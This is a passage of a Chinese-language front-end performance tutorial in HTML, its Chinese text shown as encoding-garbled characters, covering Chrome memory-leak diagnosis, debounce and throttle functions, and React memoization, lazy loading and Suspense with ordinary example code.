class="hljs-string">&#x27;compute.wasm&#x27;</span>));<br>self.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> result = wasmModule.<span class="hljs-property">exports</span>.<span class="hljs-title function_">compute</span>(e.<span class="hljs-property">data</span>);<br>  self.<span class="hljs-title function_">postMessage</span>(result);<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆChrome-Memoryé¢æ¿ï¼‰"><a href="#å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆChrome-Memoryé¢æ¿ï¼‰" class="headerlink" title="å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆChrome Memoryé¢æ¿ï¼‰"></a>å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆChrome Memoryé¢æ¿ï¼‰</h3><p><strong>å†…å­˜æ³„æ¼æ ¸å¿ƒç‰¹å¾</strong></p><pre class="mermaid">graph LR    A[å†…å­˜åˆ†é…] --> B[æœªé‡Šæ”¾]    B --> C[å †å†…å­˜æŒç»­å¢é•¿]    C --> D[é¡µé¢å¡é¡¿å´©æºƒ]</pre><p>å…³é”®è¡¨ç°ï¼š</p><ul><li>é¡µé¢æ“ä½œåå†…å­˜ä¸å›è½</li><li>æ—¶é—´çº¿æ˜¾ç¤ºé”¯é½¿çŠ¶ä¸Šå‡ï¼ˆGCåä»å¢é•¿ï¼‰</li><li>æœ€ç»ˆè§¦å‘ Out of Memory å´©æºƒ</li></ul><p><strong>Chrome Memory é¢æ¿ä¸‰å‰‘å®¢</strong></p><p>(1) Heap Snapshotï¼ˆå †å¿«ç…§ï¼‰</p><p>(2) Allocation Instrumentationï¼ˆåˆ†é…åˆ†æï¼‰</p><pre class="mermaid">graph TB    A[å¼€å§‹è®°å½•] --> B[æ‰§è¡Œç”¨æˆ·æ“ä½œ]    B --> C[åœæ­¢è®°å½•]    C --> D[å®šä½æœªé‡Šæ”¾å†…å­˜]</pre><p>(3) Allocation Timelineï¼ˆåˆ†é…æ—¶é—´çº¿ï¼‰</p><p><strong>æ’æŸ¥æµç¨‹äº”æ­¥æ³•</strong></p><p>æ­¥éª¤1ï¼šå¤ç°æ³„æ¼</p><ul><li>æ‰“å¼€ Chrome DevTools â†’ Memory é¢æ¿</li><li>æ‰§è¡Œå¯ç–‘æ“ä½œï¼ˆå¦‚æ‰“å¼€&#x2F;å…³é—­å¼¹çª—ï¼‰</li><li>æ‰‹åŠ¨è§¦å‘GCï¼ˆç‚¹å‡»åƒåœ¾æ¡¶å›¾æ ‡ï¼‰</li></ul><p>æ­¥éª¤2ï¼šåˆ›å»ºåŸºå‡†å¿«ç…§</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Text">// æ“ä½œå‰ï¼šåˆå§‹çŠ¶æ€<br>1. ç‚¹å‡» &quot;Take snapshot&quot; â†’ ä¿å­˜ä¸º &quot;Snapshot 1&quot;<br></code></pre></td></tr></table></figure><p>æ­¥éª¤3ï¼šæ‰§è¡Œæ³„æ¼æ“ä½œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ¨¡æ‹Ÿç”¨æˆ·è¡Œä¸º</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>  <span class="hljs-title function_">openModal</span>();  <span class="hljs-comment">// æ‰“å¼€å¼¹çª—</span><br>  <span class="hljs-title function_">closeModal</span>(); <span class="hljs-comment">// å…³é—­å¼¹çª—</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¥éª¤4ï¼šåˆ›å»ºå¯¹æ¯”å¿«ç…§</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">// æ“ä½œåï¼šç†æƒ³çŠ¶æ€åº”å›åˆ°åˆå§‹å†…å­˜<br>1. æ‰‹åŠ¨è§¦å‘GC<br>2. ç‚¹å‡» &quot;Take snapshot&quot; â†’ ä¿å­˜ä¸º &quot;Snapshot 2&quot;<br></code></pre></td></tr></table></figure><p>æ­¥éª¤5ï¼šåˆ†æå·®å¼‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">1. é€‰æ‹© &quot;Snapshot 2&quot;<br>2. åˆ‡æ¢æ¯”è¾ƒæ¨¡å¼ä¸º &quot;Snapshot 1&quot;<br>3. ç­›é€‰ &quot;All objects&quot; æŸ¥çœ‹ #Delta æ­£å¢é•¿é¡¹<br></code></pre></td></tr></table></figure><p><strong>æ³„æ¼æ¨¡å¼è¯Šæ–­è¡¨</strong></p><table><thead><tr><th align="left">æ³„æ¼ç±»å‹</th><th align="left">å…³é”®ç‰¹å¾</th><th align="left">æ’æŸ¥æŠ€å·§</th></tr></thead><tbody><tr><td align="left">æœªè§£ç»‘äº‹ä»¶</td><td align="left">EventListener æ•°é‡æŒç»­å¢é•¿</td><td align="left">æœç´¢ EventListener ä¿ç•™æ ‘</td></tr><tr><td align="left">DOMæ¸¸ç¦»èŠ‚ç‚¹</td><td align="left">Detached HTMLDivElement å †ç§¯</td><td align="left">ç­›é€‰ Detached èŠ‚ç‚¹</td></tr><tr><td align="left">é—­åŒ…ç´¯ç§¯</td><td align="left">Closure å ç”¨å·¨å¤§</td><td align="left">æ£€æŸ¥å‡½æ•°ä¸Šä¸‹æ–‡å¼•ç”¨é“¾</td></tr><tr><td align="left">å®šæ—¶å™¨æœªæ¸…é™¤</td><td align="left">setInterval æŒæœ‰å¯¹è±¡</td><td align="left">æœç´¢ Timer æŒæœ‰è€…</td></tr><tr><td align="left">å…¨å±€ç¼“å­˜è†¨èƒ€</td><td align="left">å…¨å±€æ•°ç»„&#x2F;å¯¹è±¡å¤§å°åªå¢ä¸å‡</td><td align="left">è·Ÿè¸ªå¤§å¯¹è±¡åˆ†é…è·¯å¾„</td></tr></tbody></table><p><strong>å†…å­˜åˆ†é…è¿½è¸ª</strong></p><p>(1) æ—¶é—´çº¿å®šä½æ³„éœ²ç‚¹</p><pre class="mermaid">timeline    title å†…å­˜åˆ†é…æ—¶é—´çº¿    section æ“ä½œè¿‡ç¨‹    ç‚¹å‡»æ‰“å¼€å¼¹çª— ï¼š å†…å­˜+15MB    å…³é—­å¼¹çª— ï¼š å†…å­˜-2MB    å¾ªç¯10æ¬¡ ï¼š å†…å­˜+130MB // æ³„æ¼ï¼</pre><p>(2) ç«ç„°å›¾åˆ†æ</p><ul><li>å¼€å¯ â€œAllocation instrumentationâ€</li><li>æ‰§è¡Œæ“ä½œ â†’ åœæ­¢è®°å½•</li><li>åˆ†æå †æ ˆç«ç„°å›¾ï¼š<ul><li>è“è‰²æ¡ï¼šæœªå›æ”¶å†…å­˜</li><li>è°ƒç”¨æ ‘å®šä½æ³„æ¼å‡½æ•°</li></ul></li></ul><h3 id="é˜²æŠ–ï¼ˆDebounceï¼‰ä¸èŠ‚æµï¼ˆThrottleï¼‰"><a href="#é˜²æŠ–ï¼ˆDebounceï¼‰ä¸èŠ‚æµï¼ˆThrottleï¼‰" class="headerlink" title="é˜²æŠ–ï¼ˆDebounceï¼‰ä¸èŠ‚æµï¼ˆThrottleï¼‰"></a>é˜²æŠ–ï¼ˆDebounceï¼‰ä¸èŠ‚æµï¼ˆThrottleï¼‰</h3><p>è¿™ä¸¤ä¸ªæ¦‚å¿µæ˜¯è§£å†³é«˜é¢‘äº‹ä»¶ï¼ˆå¦‚æ»šåŠ¨ scrollã€çª—å£è°ƒæ•´å¤§å° resizeã€é¼ æ ‡ç§»åŠ¨ mousemoveã€è¾“å…¥æ¡†è¾“å…¥ inputã€é”®ç›˜æŒ‰ä¸‹ keyup&#x2F;keydown ç­‰ï¼‰å¯¼è‡´æ€§èƒ½é—®é¢˜çš„æ ¸å¿ƒç­–ç•¥ã€‚å®ƒä»¬çš„ç›®æ ‡éƒ½æ˜¯é™åˆ¶äº‹ä»¶å¤„ç†å‡½æ•°è¢«æ‰§è¡Œçš„é¢‘ç‡ï¼Œä»è€Œå‡å°‘ä¸å¿…è¦çš„ã€æ˜‚è´µçš„è®¡ç®—ã€DOM æ“ä½œæˆ–ç½‘ç»œè¯·æ±‚ï¼ˆå¦‚æœç´¢å»ºè®®ï¼‰ï¼Œæå‡é¡µé¢å“åº”æ€§å’Œæµç•…åº¦ã€‚</p><p><strong>é˜²æŠ–ï¼ˆDebounceï¼‰</strong></p><p>æ ¸å¿ƒæ€æƒ³ï¼šâ€œç­‰ä¸€ç­‰ï¼Œç­‰ä½ æ¶ˆåœäº†å†è¯´â€</p><p>å·¥ä½œåŸç†ï¼š</p><ul><li>å½“äº‹ä»¶è¿ç»­è§¦å‘æ—¶ï¼Œé˜²æŠ–å‡½æ•°ä¸ä¼šç«‹å³æ‰§è¡Œã€‚</li><li>å®ƒä¼šè®¾ç½®ä¸€ä¸ªç­‰å¾…è®¡æ—¶å™¨ï¼ˆtimerï¼‰ã€‚</li><li>å¦‚æœåœ¨ç­‰å¾…æ—¶é—´ï¼ˆdelayï¼‰ å†…ï¼Œäº‹ä»¶å†æ¬¡è¢«è§¦å‘ï¼Œåˆ™æ¸…é™¤ä¹‹å‰çš„è®¡æ—¶å™¨ï¼Œå¹¶é‡æ–°å¼€å§‹è®¡æ—¶ã€‚</li><li>åªæœ‰åœ¨äº‹ä»¶åœæ­¢è§¦å‘ï¼Œå¹¶ä¸”ç­‰å¾…æ—¶é—´ delay æ¯«ç§’è¿‡å»ä¹‹åï¼Œç›®æ ‡å‡½æ•°æ‰ä¼šæ‰§è¡Œä¸€æ¬¡ã€‚</li></ul><p>å®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">func, delay</span>) &#123;<br>  <span class="hljs-keyword">let</span> timeoutId; <span class="hljs-comment">// ç”¨äºå­˜å‚¨è®¡æ—¶å™¨ID</span><br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) &#123; <span class="hljs-comment">// è¿”å›åŒ…è£…åçš„å‡½æ•°</span><br>    <span class="hljs-built_in">clearTimeout</span>(timeoutId); <span class="hljs-comment">// æ¯æ¬¡è§¦å‘éƒ½æ¸…é™¤ä¹‹å‰çš„è®¡æ—¶å™¨</span><br>    timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">// è®¾ç½®æ–°çš„è®¡æ—¶å™¨</span><br>      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); <span class="hljs-comment">// ç­‰å¾…delayåæ‰§è¡ŒåŸå‡½æ•°</span><br>    &#125;, delay);<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹ï¼šæœç´¢æ¡†è¾“å…¥é˜²æŠ–</span><br><span class="hljs-keyword">const</span> searchInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;search&#x27;</span>);<br><span class="hljs-keyword">const</span> fetchSuggestions = <span class="hljs-title function_">debounce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">query</span>) &#123;<br>  <span class="hljs-comment">// å‘é€è¯·æ±‚è·å–æœç´¢å»ºè®®...</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Fetching suggestions for:&#x27;</span>, query);<br>&#125;, <span class="hljs-number">300</span>); <span class="hljs-comment">// å»¶è¿Ÿ300ms</span><br><br>searchInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetchSuggestions</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// ä½¿ç”¨é˜²æŠ–åçš„å‡½æ•°</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>èŠ‚æµï¼ˆThrottleï¼‰</strong></p><p>æ ¸å¿ƒæ€æƒ³ï¼šâ€œä¸ç®¡ä½ æ€ä¹ˆé—¹ï¼Œæˆ‘å›ºå®šæ—¶é—´åªåšä¸€æ¬¡â€ã€‚</p><p>å·¥ä½œåŸç†ï¼š</p><ul><li>å½“äº‹ä»¶è¿ç»­è§¦å‘æ—¶ï¼ŒèŠ‚æµå‡½æ•°ä¼šæŒ‰ç…§å›ºå®šçš„æ—¶é—´é—´éš”ï¼ˆdelayï¼‰ æ‰§è¡Œç›®æ ‡å‡½æ•°ã€‚</li><li>å®ƒä¿è¯åœ¨ delay æ¯«ç§’å†…ï¼Œç›®æ ‡å‡½æ•°æœ€å¤šåªæ‰§è¡Œä¸€æ¬¡ã€‚</li><li>æœ‰ä¸¤ç§å¸¸è§å®ç°æ–¹å¼ï¼š<ul><li>è®¡æ—¶å™¨æ–¹å¼ï¼š ç¬¬ä¸€æ¬¡è§¦å‘ç«‹å³æ‰§è¡Œå¹¶å¼€å¯è®¡æ—¶å™¨ï¼Œåœ¨è®¡æ—¶å™¨ç»“æŸå‰å¿½ç•¥åç»­è§¦å‘ã€‚è®¡æ—¶å™¨ç»“æŸåï¼Œå†å“åº”ä¸‹ä¸€æ¬¡è§¦å‘ã€‚</li><li>æ—¶é—´æˆ³æ–¹å¼ï¼š è®°å½•ä¸Šæ¬¡æ‰§è¡Œçš„æ—¶é—´æˆ³ lastExecã€‚æ¯æ¬¡è§¦å‘æ—¶ï¼Œæ£€æŸ¥å½“å‰æ—¶é—´ä¸ lastExec çš„å·®å€¼æ˜¯å¦å¤§äº delayã€‚å¦‚æœå¤§äºï¼Œåˆ™æ‰§è¡Œå‡½æ•°å¹¶æ›´æ–° lastExecï¼›å¦åˆ™å¿½ç•¥ã€‚</li></ul></li></ul><p>å®ç°ï¼ˆæ—¶é—´æˆ³æ–¹å¼ - æ›´ç²¾ç¡®æ§åˆ¶é¦–æ¬¡å’Œæœ€åä¸€æ¬¡ï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">func, delay</span>) &#123;<br>  <span class="hljs-keyword">let</span> lastExec = <span class="hljs-number">0</span>; <span class="hljs-comment">// ä¸Šæ¬¡æ‰§è¡Œçš„æ—¶é—´æˆ³</span><br>  <span class="hljs-keyword">let</span> timeoutId; <span class="hljs-comment">// å¯é€‰ï¼Œç”¨äºå¤„ç†å°¾éšè°ƒç”¨ï¼ˆå¦‚æœéœ€è¦ï¼‰</span><br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) &#123;<br>    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(); <span class="hljs-comment">// å½“å‰æ—¶é—´æˆ³</span><br>    <span class="hljs-keyword">const</span> timeSinceLastExec = now - lastExec;<br><br>    <span class="hljs-keyword">if</span> (timeSinceLastExec &gt;= delay) &#123;<br>      <span class="hljs-comment">// è·ç¦»ä¸Šæ¬¡æ‰§è¡Œå·²è¶…è¿‡delayï¼Œç«‹å³æ‰§è¡Œ</span><br>      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);<br>      lastExec = now;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// å¯é€‰ï¼šå¦‚æœå¸Œæœ›åœ¨åœæ­¢è§¦å‘åè¿˜èƒ½æ‰§è¡Œä¸€æ¬¡ï¼ˆå°¾éšè°ƒç”¨ï¼‰</span><br>      <span class="hljs-comment">// æ¸…é™¤ä¹‹å‰å¯èƒ½è®¾ç½®çš„å°¾éšè®¡æ—¶å™¨</span><br>      <span class="hljs-built_in">clearTimeout</span>(timeoutId);<br>      <span class="hljs-comment">// è®¾ç½®æ–°çš„è®¡æ—¶å™¨ï¼Œåœ¨å‰©ä½™æ—¶é—´åæ‰§è¡Œ</span><br>      timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);<br>        lastExec = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(); <span class="hljs-comment">// æ›´æ–°æ‰§è¡Œæ—¶é—´</span><br>      &#125;, delay - timeSinceLastExec);<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹ï¼šæ»šåŠ¨äº‹ä»¶èŠ‚æµ</span><br><span class="hljs-keyword">const</span> handleScroll = <span class="hljs-title function_">throttle</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ»šåŠ¨åˆ°åº•éƒ¨ã€æ›´æ–°UIç­‰...</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Handling scroll...&#x27;</span>);<br>&#125;, <span class="hljs-number">250</span>); <span class="hljs-comment">// æœ€å¤šæ¯250msæ‰§è¡Œä¸€æ¬¡</span><br><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;scroll&#x27;</span>, handleScroll);<br></code></pre></td></tr></table></figure><p><strong>é˜²æŠ– vs èŠ‚æµï¼šå…³é”®åŒºåˆ«æ€»ç»“</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">é˜²æŠ– (Debounce)</th><th align="left">èŠ‚æµ (Throttle)</th></tr></thead><tbody><tr><td align="left">æ ¸å¿ƒç›®æ ‡</td><td align="left">åœ¨äº‹ä»¶åœæ­¢è§¦å‘åæ‰§è¡Œä¸€æ¬¡</td><td align="left">å›ºå®šé—´éš”æ‰§è¡Œä¸€æ¬¡ï¼Œä¸ç®¡è§¦å‘é¢‘ç‡å¤šé«˜</td></tr><tr><td align="left">æ‰§è¡Œæ—¶æœº</td><td align="left">ç­‰å¾…æœŸ (delay) ç»“æŸåæ‰§è¡Œ</td><td align="left">é—´éš”æœŸ (delay) å¼€å§‹æˆ–ç»“æŸæ—¶æ‰§è¡Œ</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">å…³æ³¨æœ€ç»ˆçŠ¶æ€ (åœæ­¢è¾“å…¥ã€åœæ­¢è°ƒæ•´å¤§å°)</td><td align="left">å…³æ³¨è¿‡ç¨‹çŠ¶æ€ (æ»šåŠ¨ä½ç½®ã€é¼ æ ‡ä½ç½®)</td></tr><tr><td align="left">æ•ˆæœ</td><td align="left">å¯†é›†è§¦å‘åªæ‰§è¡Œä¸€æ¬¡ (æœ€åé‚£æ¬¡)</td><td align="left">å¯†é›†è§¦å‘æŒ‰å›ºå®šé¢‘ç‡æ‰§è¡Œå¤šæ¬¡</td></tr></tbody></table><h1 id="å››ã€åº”ç”¨çº§ä¼˜åŒ–ç­–ç•¥"><a href="#å››ã€åº”ç”¨çº§ä¼˜åŒ–ç­–ç•¥" class="headerlink" title="å››ã€åº”ç”¨çº§ä¼˜åŒ–ç­–ç•¥"></a>å››ã€åº”ç”¨çº§ä¼˜åŒ–ç­–ç•¥</h1><h2 id="4-1-æ¡†æ¶ä¸“é¡¹ä¼˜åŒ–"><a href="#4-1-æ¡†æ¶ä¸“é¡¹ä¼˜åŒ–" class="headerlink" title="4.1 æ¡†æ¶ä¸“é¡¹ä¼˜åŒ–"></a>4.1 æ¡†æ¶ä¸“é¡¹ä¼˜åŒ–</h2><h3 id="Reactï¼šMemoizationã€æ‡’åŠ è½½ç»„ä»¶ã€å¹¶å‘æ¨¡å¼ï¼ˆSuspenseï¼‰"><a href="#Reactï¼šMemoizationã€æ‡’åŠ è½½ç»„ä»¶ã€å¹¶å‘æ¨¡å¼ï¼ˆSuspenseï¼‰" class="headerlink" title="Reactï¼šMemoizationã€æ‡’åŠ è½½ç»„ä»¶ã€å¹¶å‘æ¨¡å¼ï¼ˆSuspenseï¼‰"></a>Reactï¼šMemoizationã€æ‡’åŠ è½½ç»„ä»¶ã€å¹¶å‘æ¨¡å¼ï¼ˆSuspenseï¼‰</h3><p><strong>Memoizationï¼ˆè®°å¿†åŒ–ï¼‰</strong></p><p>æ ¸å¿ƒç›®æ ‡ï¼šé¿å…ä¸å¿…è¦çš„ç»„ä»¶é‡æ¸²æŸ“</p><p>å®ç°æœºåˆ¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. React.memo (ç»„ä»¶çº§è®°å¿†)</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MemoizedComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-comment">/* ä»…å½“propså˜æ›´æ—¶é‡æ¸²æŸ“ */</span><br>  &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">prevProps, nextProps</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒé€»è¾‘ï¼ˆéå¿…é¡»ï¼‰</span><br>    <span class="hljs-keyword">return</span> prevProps.<span class="hljs-property">id</span> === nextProps.<span class="hljs-property">id</span>;<br>  &#125;<br>);<br><br><span class="hljs-comment">// 2. useMemo (å€¼è®°å¿†)</span><br><span class="hljs-keyword">const</span> expensiveValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">computeExpensiveValue</span>(a, b);<br>&#125;, [a, b]); <span class="hljs-comment">// ä¾èµ–é¡¹å˜åŒ–æ—¶é‡æ–°è®¡ç®—</span><br><br><span class="hljs-comment">// 3. useCallback (å‡½æ•°è®°å¿†)</span><br><span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">doSomething</span>(a, b);<br>&#125;, [a, b]); <span class="hljs-comment">// ä¾èµ–ä¸å˜æ—¶è¿”å›ç›¸åŒå‡½æ•°å¼•ç”¨</span><br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åœºæ™¯ï¼š</p><ul><li>çˆ¶ç»„ä»¶é¢‘ç¹æ¸²æŸ“ä½†å­ç»„ä»¶propsæœªå˜åŒ–</li><li>è®¡ç®—æˆæœ¬é«˜çš„æ•°æ®æ¨å¯¼</li><li>ä½œä¸ºä¾èµ–é¡¹çš„å‡½æ•°&#x2F;å¯¹è±¡ï¼ˆé¿å…ä¸‹æ¸¸useEffectæ— æ•ˆè§¦å‘ï¼‰</li></ul><p><strong>æ‡’åŠ è½½ç»„ä»¶ï¼ˆCode Splittingï¼‰</strong></p><p>æ ¸å¿ƒç›®æ ‡ï¼šå‡å°‘é¦–å±JSä½“ç§¯</p><p>å®ç°æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. React.lazy + Suspense åŸºç¡€ç”¨æ³•</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductList</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductList&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProductList</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 2. è·¯ç”±çº§æ‡’åŠ è½½ (React Router v6)</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/products&quot;</span>,<br>    <span class="hljs-attr">element</span>: (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">PageSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ProductsPage</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>    ),<br>    <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;./pages/Products&quot;</span>) <span class="hljs-comment">// å¹¶è¡ŒåŠ è½½</span><br>  &#125;<br>]);<br></code></pre></td></tr></table></figure><p><strong>å¹¶å‘æ¨¡å¼ï¼ˆConcurrent Modeï¼‰ä¸ Suspense</strong></p><p>æ ¸å¿ƒèƒ½åŠ›ï¼šå¯ä¸­æ–­æ¸²æŸ“ä¸ä¼˜å…ˆçº§è°ƒåº¦</p><p>æŠ€æœ¯ç»„åˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. createRoot å¯ç”¨å¹¶å‘æ¨¡å¼</span><br><span class="hljs-keyword">import</span> &#123; createRoot &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom/client&#x27;</span>;<br><span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)).<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>);<br><br><span class="hljs-comment">// 2. Suspense æ•°æ®è·å–</span><br><span 